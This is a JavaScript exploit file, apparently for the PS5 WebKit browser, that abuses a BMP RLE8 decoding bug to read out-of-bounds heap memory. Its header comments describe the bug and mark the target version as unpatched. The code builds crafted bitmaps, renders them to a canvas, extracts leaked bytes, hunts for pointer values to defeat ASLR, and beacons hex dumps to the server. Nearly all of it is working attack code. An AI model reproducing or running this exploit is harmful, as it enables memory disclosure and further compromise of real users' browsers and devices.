// p400 - BMP RLE8 OOB read info leak (ASLR defeat)
//
// Bug: BMPImageReader::readCurrentPixel (BMPImageReader.h:197)
// uses m_coord.x() * bytesPerPixel as offset from m_decodedOffset.
// In RLE absolute mode after delta, m_decodedOffset = run data start
// but m_coord.x() is the absolute position (set by delta).
// Result: reads offset X from run data instead of offset 0.
// For X > run_data_size, reads OOB from heap.
//
// Fixed in WK-1400: (m_coord.x() - startX) * bytesPerPixel
// PS5 WK-1200: UNPATCHED
//
// Identity palette: entry[i] = RGB(i,0,i). Red channel = leaked byte value.
// Canvas getImageData() reads heap data as pixel colors.
//
// Beacon prefix: V400-

(function() {
  var BQ = 0;
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V400-' + tag + '?t=' + Date.now() + '&q=' + (BQ++), false);
      x.send('');
    } catch(e) {}
  }
  function hx(v) { return (v < 16 ? '0' : '') + v.toString(16); }

  B('BOOT');

  try {
    var W = 1024, H = 2;
    var PAL = 256 * 4;
    var HDR = 14 + 40 + PAL; // 1078

    // Build RLE pixel data
    var rle = [];

    // Row 0 (bottom): fill 1024 px with index 0
    rle.push(0xFF, 0x00, 0xFF, 0x00, 0xFF, 0x00, 0xFF, 0x00, 0x04, 0x00);
    rle.push(0x00, 0x00); // EOL

    // Row 1 (top = canvas y=0): delta to X=512
    var DX = 512;
    var rem = DX;
    while (rem > 0) {
      var step = rem > 255 ? 255 : rem;
      rle.push(0x00, 0x02, step, 0x00);
      rem -= step;
    }

    // Record where absolute data starts (for diagnosis)
    var absFilePos = HDR + rle.length + 2; // +2 for [0x00, count] header

    // Absolute mode: fill remaining 512 pixels
    var toFill = W - DX; // 512
    var filled = 0;
    while (filled < toFill) {
      var chunk = toFill - filled;
      if (chunk > 255) chunk = 255;
      if (chunk >= 3) {
        rle.push(0x00, chunk);
        for (var i = 0; i < chunk; i++) rle.push(0xAA);
        if (chunk % 2 !== 0) rle.push(0x00); // pad odd
      } else {
        rle.push(chunk, 0xAA); // encoded mode for count < 3
      }
      filled += chunk;
    }
    rle.push(0x00, 0x00); // EOL
    rle.push(0x00, 0x01); // EOB

    var fSize = HDR + rle.length;
    B('FILE-' + fSize + '-ABS-' + absFilePos + '-OOB-' + (absFilePos + DX - fSize));

    // Build BMP
    var bmp = new Uint8Array(fSize);
    var p = 0;

    // File header
    bmp[p++] = 0x42; bmp[p++] = 0x4D;
    bmp[p++] = fSize & 0xFF; bmp[p++] = (fSize >> 8) & 0xFF;
    bmp[p++] = (fSize >> 16) & 0xFF; bmp[p++] = (fSize >> 24) & 0xFF;
    p += 4;
    bmp[p++] = HDR & 0xFF; bmp[p++] = (HDR >> 8) & 0xFF;
    bmp[p++] = (HDR >> 16) & 0xFF; bmp[p++] = (HDR >> 24) & 0xFF;

    // DIB header
    bmp[p++] = 40; p += 3;
    bmp[p++] = W & 0xFF; bmp[p++] = (W >> 8) & 0xFF; p += 2;
    bmp[p++] = H & 0xFF; bmp[p++] = (H >> 8) & 0xFF; p += 2;
    bmp[p++] = 1; bmp[p++] = 0;
    bmp[p++] = 8; bmp[p++] = 0;
    bmp[p++] = 1; p += 3; // BI_RLE8
    p += 4;
    p += 4;
    p += 4;
    bmp[p++] = 0; bmp[p++] = 1; p += 2; // 256 colors
    p += 4;

    // Identity palette: entry[i] = (B=i, G=0, R=i, reserved=0)
    for (var i = 0; i < 256; i++) {
      bmp[p++] = i;
      bmp[p++] = 0;
      bmp[p++] = i;
      bmp[p++] = 0;
    }

    // RLE data
    for (var i = 0; i < rle.length; i++) bmp[p++] = rle[i];

    // Load image
    var blob = new Blob([bmp], { type: 'image/bmp' });
    var url = URL.createObjectURL(blob);
    var img = new Image();

    img.onload = function() {
      B('LOADED-' + img.width + 'x' + img.height);

      var canvas = document.createElement('canvas');
      canvas.width = W;
      canvas.height = H;
      var ctx = canvas.getContext('2d');
      ctx.drawImage(img, 0, 0);

      // Attack row: row 1 in file = y=0 (bottom-up: top of canvas)
      var d = ctx.getImageData(0, 0, W, 1).data;

      // Collect pixels from delta position to end
      var bytes = [];
      var aaCount = 0, oobCount = 0, zeroCount = 0;
      for (var x = DX; x < W; x++) {
        var r = d[x * 4];
        bytes.push(r);
        if (r === 0xAA) aaCount++;
        else if (r === 0) zeroCount++;
        else oobCount++;
      }

      B('STAT-AA' + aaCount + '-OOB' + oobCount + '-Z' + zeroCount);

      // Hex dump in 32-byte chunks
      for (var c = 0; c < bytes.length && c < 512; c += 32) {
        var h = '';
        for (var j = c; j < c + 32 && j < bytes.length; j++) h += hx(bytes[j]);
        B('D' + c + '-' + h);
      }

      // Find 8-byte pointer patterns (6+ non-zero non-0xAA)
      var ptrs = [];
      for (var i = 0; i < bytes.length - 7; i++) {
        var nz = 0;
        for (var b = 0; b < 8; b++) {
          var v = bytes[i + b];
          if (v !== 0 && v !== 0xAA) nz++;
        }
        if (nz >= 6) {
          var ph = '';
          for (var b = 0; b < 8; b++) ph += hx(bytes[i + b]);
          ptrs.push('O' + i + ':' + ph);
          i += 7;
        }
      }
      B('PTRS-' + ptrs.length);
      for (var pi = 0; pi < ptrs.length && pi < 10; pi++) {
        B('P' + pi + '-' + ptrs[pi]);
      }

      // Control: bottom row (y=1) should be all zeros
      var r0 = ctx.getImageData(0, 1, W, 1).data;
      var r0nz = 0;
      for (var x = 0; x < W; x++) { if (r0[x * 4] !== 0) r0nz++; }
      B('CTL-NZ-' + r0nz);

      // Second BMP with higher delta for wider OOB coverage
      setTimeout(function() { runVariant(768); }, 500);
    };

    img.onerror = function() {
      B('IMG-ERR');
      // Try simpler BMP as fallback
      setTimeout(simpleFallback, 500);
    };

    img.src = url;

    // Variant with different delta
    function runVariant(dx2) {
      try {
        var rle2 = [];
        rle2.push(0xFF, 0x00, 0xFF, 0x00, 0xFF, 0x00, 0xFF, 0x00, 0x04, 0x00);
        rle2.push(0x00, 0x00);
        var r2 = dx2;
        while (r2 > 0) {
          var s = r2 > 255 ? 255 : r2;
          rle2.push(0x00, 0x02, s, 0x00);
          r2 -= s;
        }
        var tf = W - dx2;
        var f2 = 0;
        while (f2 < tf) {
          var c = tf - f2;
          if (c > 255) c = 255;
          if (c >= 3) {
            rle2.push(0x00, c);
            for (var i = 0; i < c; i++) rle2.push(0xBB);
            if (c % 2 !== 0) rle2.push(0x00);
          } else {
            rle2.push(c, 0xBB);
          }
          f2 += c;
        }
        rle2.push(0x00, 0x00);
        rle2.push(0x00, 0x01);

        var fs2 = HDR + rle2.length;
        var bmp2 = new Uint8Array(fs2);
        var q = 0;
        bmp2[q++] = 0x42; bmp2[q++] = 0x4D;
        bmp2[q++] = fs2 & 0xFF; bmp2[q++] = (fs2 >> 8) & 0xFF;
        bmp2[q++] = (fs2 >> 16) & 0xFF; bmp2[q++] = (fs2 >> 24) & 0xFF;
        q += 4;
        bmp2[q++] = HDR & 0xFF; bmp2[q++] = (HDR >> 8) & 0xFF;
        bmp2[q++] = (HDR >> 16) & 0xFF; bmp2[q++] = (HDR >> 24) & 0xFF;
        bmp2[q++] = 40; q += 3;
        bmp2[q++] = W & 0xFF; bmp2[q++] = (W >> 8) & 0xFF; q += 2;
        bmp2[q++] = H & 0xFF; bmp2[q++] = (H >> 8) & 0xFF; q += 2;
        bmp2[q++] = 1; bmp2[q++] = 0;
        bmp2[q++] = 8; bmp2[q++] = 0;
        bmp2[q++] = 1; q += 3;
        q += 16;
        bmp2[q++] = 0; bmp2[q++] = 1; q += 2;
        q += 4;
        for (var i = 0; i < 256; i++) {
          bmp2[q++] = i; bmp2[q++] = 0; bmp2[q++] = i; bmp2[q++] = 0;
        }
        for (var i = 0; i < rle2.length; i++) bmp2[q++] = rle2[i];

        var blob2 = new Blob([bmp2], { type: 'image/bmp' });
        var url2 = URL.createObjectURL(blob2);
        var img2 = new Image();
        img2.onload = function() {
          var c2 = document.createElement('canvas');
          c2.width = W; c2.height = H;
          var cx2 = c2.getContext('2d');
          cx2.drawImage(img2, 0, 0);
          var d2 = cx2.getImageData(0, 0, W, 1).data;
          var oob2 = 0;
          var sample2 = '';
          for (var x = dx2; x < W; x++) {
            var r = d2[x * 4];
            if (r !== 0xBB) oob2++;
            if (sample2.length < 128) sample2 += hx(r);
          }
          B('V2-D' + dx2 + '-OOB' + oob2 + '-' + sample2);
          B('COMPLETE');
        };
        img2.onerror = function() { B('V2-ERR'); B('COMPLETE'); };
        img2.src = url2;
      } catch(e) {
        B('V2-EX-' + e.message.substring(0, 40));
        B('COMPLETE');
      }
    }

    // Fallback: simplest possible BMP to test if BMP loading works at all
    function simpleFallback() {
      try {
        var sw = 4, sh = 4;
        var srle = [];
        for (var r = 0; r < sh; r++) {
          srle.push(sw, r); // fill row with index = row number
          srle.push(0x00, 0x00); // EOL
        }
        srle.push(0x00, 0x01); // EOB

        var sfs = HDR + srle.length;
        var sbmp = new Uint8Array(sfs);
        var sq = 0;
        sbmp[sq++] = 0x42; sbmp[sq++] = 0x4D;
        sbmp[sq++] = sfs & 0xFF; sbmp[sq++] = (sfs >> 8) & 0xFF;
        sbmp[sq++] = (sfs >> 16) & 0xFF; sbmp[sq++] = (sfs >> 24) & 0xFF;
        sq += 4;
        sbmp[sq++] = HDR & 0xFF; sbmp[sq++] = (HDR >> 8) & 0xFF;
        sbmp[sq++] = (HDR >> 16) & 0xFF; sbmp[sq++] = (HDR >> 24) & 0xFF;
        sbmp[sq++] = 40; sq += 3;
        sbmp[sq++] = sw; sq += 3;
        sbmp[sq++] = sh; sq += 3;
        sbmp[sq++] = 1; sbmp[sq++] = 0;
        sbmp[sq++] = 8; sbmp[sq++] = 0;
        sbmp[sq++] = 1; sq += 3;
        sq += 16;
        sbmp[sq++] = 0; sbmp[sq++] = 1; sq += 2;
        sq += 4;
        for (var i = 0; i < 256; i++) {
          sbmp[sq++] = i; sbmp[sq++] = i; sbmp[sq++] = i; sbmp[sq++] = 0;
        }
        for (var i = 0; i < srle.length; i++) sbmp[sq++] = srle[i];

        var sblob = new Blob([sbmp], { type: 'image/bmp' });
        var surl = URL.createObjectURL(sblob);
        var simg = new Image();
        simg.onload = function() {
          B('FALLBACK-LOADED-' + simg.width + 'x' + simg.height);
          B('COMPLETE');
        };
        simg.onerror = function() { B('FALLBACK-ERR'); B('COMPLETE'); };
        simg.src = surl;
      } catch(e) {
        B('FALLBACK-EX-' + e.message.substring(0, 40));
        B('COMPLETE');
      }
    }

  } catch(e) {
    B('ERR-' + e.message.substring(0, 80));
  }
})();
